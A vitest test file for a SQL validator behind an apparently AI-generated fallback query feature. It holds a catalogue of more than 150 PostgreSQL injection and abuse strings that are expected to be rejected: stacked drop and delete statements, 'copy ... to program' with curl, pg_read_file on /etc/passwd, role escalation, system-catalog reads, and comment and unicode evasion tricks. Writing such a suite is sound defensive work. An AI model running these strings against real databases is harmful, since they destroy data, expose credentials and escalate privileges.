import { getPack } from '@bizr/packs';
import { describe, expect, it } from 'vitest';

import { compileChangePlan } from '../change-plan/compile';
import { planFromPack } from '../change-plan/from-pack';
import { queryableRelations } from '../change-plan/views';
import { validateFallbackSql, type SqlScope } from './validate';

const pack = getPack('retail');
const SCHEMA = 't_abcdefghij';
const { catalog } = compileChangePlan(
  SCHEMA,
  [],
  planFromPack(
    pack,
    pack.entities.map((e) => e.id),
  ),
);
const scope: SqlScope = { tenantSchema: SCHEMA, relations: queryableRelations(catalog) };
const check = (sql: string) => validateFallbackSql(sql, scope);

/** Must all be refused (AI_DESIGN §6 adversarial suite). */
const ATTACKS: string[] = [
  // More than one statement, or not a SELECT
  'select 1; drop table sales',
  'select 1; select 2',
  'select * from sales; delete from sales',
  'select 1;; select 2',
  "insert into sales (order_number) values ('x')",
  "update sales set status = 'cancelled'",
  'delete from sales',
  'merge into sales s using sales t on s._id = t._id when matched then delete',
  'truncate sales',
  'create table x (a int)',
  'create temp table x as select * from sales',
  'create view x as select 1',
  'create function f() returns int as $$ select 1 $$ language sql',
  'alter table sales add column x int',
  'alter role t_abcdefghij_reader superuser',
  'drop table sales',
  'drop schema t_abcdefghij cascade',
  'grant all on sales to public',
  'revoke select on sales from public',
  "copy sales to '/tmp/x'",
  "copy (select * from sales) to program 'curl evil'",
  'do $$ begin perform pg_sleep(10); end $$',
  'call p()',
  'set role postgres',
  'set search_path = public',
  'reset role',
  'show search_path',
  'explain select * from sales',
  'explain analyze delete from sales',
  'vacuum sales',
  'analyze sales',
  'lock table sales',
  'listen x',
  "notify x, 'y'",
  'prepare p as select 1',
  'execute p',
  'deallocate p',
  'discard all',
  'begin',
  'commit',
  'rollback',
  'savepoint a',
  'cluster sales',
  'reindex table sales',
  'refresh materialized view x',
  "comment on table sales is 'x'",
  "load 'plpgsql'",
  'checkpoint',
  "security label on table sales is 'x'",
  'import foreign schema x from server y into z',
  'values (1); drop table sales',
  // Dangerous or non-allowlisted functions, plain or nested
  "select set_config('role', 't_other_reader', false)",
  "select current_setting('search_path')",
  'select pg_sleep(10)',
  "select pg_sleep_for('1 minute')",
  'select count(pg_sleep(1)) from sales',
  "select upper(set_config('role','x',false))",
  "select * from dblink('host=x', 'select 1') as t(a int)",
  "select dblink_exec('host=x', 'drop table y')",
  "select lo_import('/etc/passwd')",
  "select lo_export(1, '/tmp/x')",
  "select pg_read_file('/etc/passwd')",
  "select pg_read_binary_file('/etc/passwd')",
  "select pg_ls_dir('.')",
  "select pg_stat_file('x')",
  'select pg_terminate_backend(1)',
  'select pg_cancel_backend(1)',
  'select pg_reload_conf()',
  "select query_to_xml('select 1', true, true, '')",
  "select xpath('/a', '<a/>')",
  'select txid_current()',
  'select pg_advisory_lock(1)',
  "select pg_notify('x', 'y')",
  'select version()',
  'select inet_server_addr()',
  'select pg_backend_pid()',
  "select nextval('x')",
  "select setval('x', 1)",
  "select pg_get_viewdef('v_sales_enriched')",
  "select format('%s', 1)",
  'select chr(65)',
  "select name from products where name like '%' || chr(0)",
  'select md5(name) from products',
  "select encode('x', 'base64')",
  "select convert_from('x', 'utf8')",
  "select to_regclass('pg_class')",
  "select has_table_privilege('sales', 'select')",
  'select pg_catalog.pg_sleep(1)',
  'select public.f()',
  'select x.y.z()',
  'select json_agg(s) from sales s',
  'select row_to_json(s) from sales s',
  "select regexp_replace(name, '(a+)+$', '') from products",
  'select xmlelement(name a)',
  'select * from unnest(array[1,2])',
  'select * from pg_sleep(1)',
  "select * from json_each('{}')",
  'select * from generate_series(1,3) with ordinality',
  'select * from rows from (generate_series(1,3))',
  'select * from sales, lateral generate_series(1, 3) g',
  // Other schemas, system catalogs and unknown relations
  'select * from pg_catalog.pg_user',
  'select * from pg_shadow',
  'select * from pg_authid',
  'select * from pg_class',
  'select * from pg_namespace',
  'select * from pg_stat_activity',
  'select * from information_schema.tables',
  'select * from information_schema.columns',
  'select * from t_other00000.sales',
  'select * from "t_other00000"."sales"',
  'select * from public.sales',
  'select * from t_abcdefghij_snap.sales',
  'select * from app.user',
  'select * from app.session',
  'select * from pgboss.job',
  'select * from bizretriever.t_abcdefghij.sales',
  'select * from t_abcdefghij.sales limit 1',
  'select s._row_hash from t_abcdefghij.sales s',
  'select * from secrets',
  'select * from sales s join pg_class c on true',
  'select (select usename from pg_user limit 1)',
  'select * from sales where exists (select 1 from pg_class)',
  'select * from sales where _id in (select oid from pg_class)',
  'select * from U&"pg\\0063atalog".pg_class',
  'select * from U&"t_other\\0030\\0030\\0030\\0030\\0030".sales',
  'with x as (select * from pg_user) select * from x',
  'with recursive r(n) as (select 1 union all select n + 1 from r) select count(*) from r',
  'with recursive r as (select 1) select * from r',
  'with sales as (select * from pg_user) select * from sales',
  'with x as materialized (select 1) select * from x',
  // Locking, INTO, sampling, parameters
  'select * from sales for update',
  'select * from sales for share',
  'select * from sales for no key update',
  'select * from sales for key share',
  'select * into stolen from sales',
  'select * into temp stolen from sales',
  'select * from sales tablesample system (10)',
  'select * from sales tablesample bernoulli (1)',
  'select $1',
  'select * from sales where _id = $1',
  // Casts and operators
  "select 'pg_class'::regclass",
  "select 'now'::regproc",
  'select 1::oid',
  "select '<a/>'::xml",
  "select '{}'::json",
  "select '{1}'::text[]",
  'select 1 operator(pg_catalog.+) 1',
  "select name from products where name ~ '(a+)+$'",
  "select name from products where name similar to '%x%'",
  "select '1' @@ '1'",
  'select array(select 1)',
  'select a[1] from (select array[1,2] a) x',
  'select 1 from sales group by grouping sets ((status), ())',
  'select name collate "C" from products',
  'select percentile_cont(0.5) within group (order by name) as x, count(*) within group (order by name) from products',
  // Internal columns
  'select _row_hash from sales',
  'select _source_upload_id from sales',
  'select s._source_row from sales s',
  'select * from sales where _deleted_at is not null',
  'select _natural_key from customers',
  'select count(*) from sales where _source_sheet is null',
  // Comment and quoting tricks
  'select 1 /* ; */ ; drop table sales',
  'select 1 -- harmless\n; drop table sales',
  '/* x */ delete from sales',
  '-- comment\ndelete from sales',
  'select 1 /* nested /* comment */ */; drop table sales',
  "select E'\\''; drop table sales; --'",
  'select $$ $$; drop table sales; select $$ $$',
  'select 1\u0000; drop table sales',
  'sel/**/ect 1',
  "select 'x' || (select string_agg(usename, ',') from pg_user)",
  // Size and depth
  `select ${'abs('.repeat(40)}1${')'.repeat(40)}`,
  `select ${Array.from({ length: 2500 }, (_, i) => i).join(' + ')}`,
  `select ${'x'.repeat(21000)}`,
];

/** Legitimate questions the fallback should be able to answer. */
const ALLOWED: string[] = [
  'select count(*) from sales',
  'select * from sales;',
  'table sales',
  'values (1)',
  "select order_number, sale_date from sales where status = 'completed' order by sale_date desc limit 10",
  'select channel, count(*) as orders from sales group by channel order by orders desc',
  "select date_trunc('month', sale_date) as month, sum(line_total) from v_sale_lines_enriched group by 1 order by 1",
  'select p.name, sum(l.quantity) from sale_lines l join products p on p._id = l.product_id group by p.name order by 2 desc limit 5',
  'select extract(year from sale_date), count(*) from sales group by 1',
  'select coalesce(sum(refund_amount), 0) from returns',
  "select name from products where lower(name) like '%mug%'",
  "with monthly as (select date_trunc('month', sale_date) m, count(*) n from sales group by 1) select m, n, lag(n) over (order by m) from monthly",
  'select * from (select channel, count(*) n from sales group by channel) t where n > 10',
  'select name, unit_price from products where unit_price > (select avg(unit_price) from products)',
  "select case when quantity > 5 then 'big' else 'small' end, count(*) from sale_lines group by 1",
  'select greatest(1, 2), least(1, 2), nullif(1, 1), round(1.234, 2), abs(-1)',
  'select current_date, now()',
  "select (sale_date at time zone 'America/New_York')::date from sales limit 1",
  'select count(distinct customer_id) from sales',
  "select to_char(sale_date, 'YYYY-MM') from sales limit 1",
  "select interval '30 days'",
  'select percentile_cont(0.5) within group (order by unit_price) from products',
  'select channel from sales union select channel from sales',
  'select * from generate_series(1, 3) g',
  'select row_number() over (partition by channel order by sale_date) from sales limit 5',
  'select count(*) filter (where quantity > 1) from sale_lines',
  'select exists (select 1 from returns)',
  "select $$it's$$",
  "select 'Café'::text, name from products where name = 'Crème brûlée' or name = 'x'",
  '/* lead comment */ select 1',
  'with x as (select 1 as a) /* mid */ select a from x',
];

describe('validateFallbackSql adversarial suite', () => {
  it('has at least 150 attack cases', () => {
    expect(ATTACKS.length).toBeGreaterThanOrEqual(150);
  });

  it.each(ATTACKS.map((sql) => [sql.slice(0, 80), sql]))('rejects %s', async (_label, sql) => {
    const r = await check(sql);
    expect(r.ok, r.ok ? r.sql : r.reason).toBe(false);
  });
});

describe('validateFallbackSql accepts ordinary analysis', () => {
  it.each(ALLOWED.map((sql) => [sql.slice(0, 80), sql]))('accepts %s', async (_label, sql) => {
    const r = await check(sql);
    expect(r.ok, r.ok ? '' : r.reason).toBe(true);
  });

  it('shadows every relation with a deleted-records filter and only public columns', async () => {
    const r = await check('select * from sales');
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.relations).toEqual(['sales']);
    expect(r.sql).toMatch(
      /^WITH "sales" AS \(SELECT .* FROM "t_abcdefghij"\."sales" WHERE "_deleted_at" IS NULL\)/,
    );
    expect(r.sql).not.toMatch(/_row_hash|_source_/);
  });

  it('merges shadows into an existing WITH, after leading comments', async () => {
    const r = await check('/* c */ WITH x AS (SELECT count(*) n FROM returns) SELECT n FROM x');
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.sql.startsWith('/* c */ WITH "returns" AS (')).toBe(true);
    expect(r.sql).toContain(', x AS (SELECT count(*) n FROM returns)');
  });

  it('handles non-ASCII text before the WITH', async () => {
    const r = await check("/* Café */ WITH x AS (SELECT 'é' a FROM products) SELECT a FROM x");
    expect(r.ok, r.ok ? '' : r.reason).toBe(true);
  });
});
